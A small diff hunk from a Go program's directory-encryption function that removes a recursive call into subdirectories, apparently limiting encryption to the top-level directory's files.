@@ -57,8 +57,6 @@ func encrypt(dirToEncrypt string, c cipher.AEAD, nameOfLogFile string) {
 
 			helpers.WriteLog(nameOfLogFile, "Encrypted: "+file, 2)
 
-		} else {
-			encrypt(info.Name(), c, nameOfLogFile)
 		}
 	}
 
